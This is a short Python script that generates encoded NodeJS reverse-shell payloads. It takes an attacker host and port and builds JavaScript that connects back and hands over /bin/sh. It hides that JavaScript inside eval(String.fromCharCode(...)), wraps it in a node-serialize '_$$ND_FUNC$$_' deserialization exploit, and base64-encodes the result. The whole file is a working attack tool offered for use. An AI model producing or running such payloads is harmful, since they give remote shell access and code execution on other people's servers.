#!/usr/bin/python
# Generator for encoded NodeJS reverse shells
# Based on the NodeJS reverse shell by Evilpacket
# https://github.com/evilpacket/node-shells/blob/master/node_revshell.js
# Onelineified and suchlike by infodox (and felicity, who sat on the keyboard)
# Insecurety Research (2013) - insecurety.net
# Modified by @jrknox1977 07-2022 to fix some issues.

import sys
import base64

if len(sys.argv) != 3:
    print(f"\nUsage: {sys.argv[0]} <LHOST> <LPORT>")
    sys.exit(0)

IP_ADDR = sys.argv[1]
PORT = sys.argv[2]


def charencode(string):
    """String.CharCode"""
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]


print("[+] LHOST = " + IP_ADDR)
print("[+] LPORT = " + PORT)
NODEJS_REV_SHELL = '''
var net = require('net');
var spawn = require('child_process').spawn;
HOST="%s";
PORT="%s";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected!\\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);
''' % (IP_ADDR, PORT)
print("[+] Encoding")
print("njs payload: " + NODEJS_REV_SHELL)
PAYLOAD = charencode(NODEJS_REV_SHELL)
PAYLOAD = "eval(String.fromCharCode(" + PAYLOAD + "))"
print(PAYLOAD)

PAYLOAD = '{"rce":"_$$ND_FUNC$$_function (){' + PAYLOAD + '}()"}'
print(PAYLOAD)
PAYLOAD = base64.b64encode(PAYLOAD.encode('ascii'))
print(PAYLOAD)
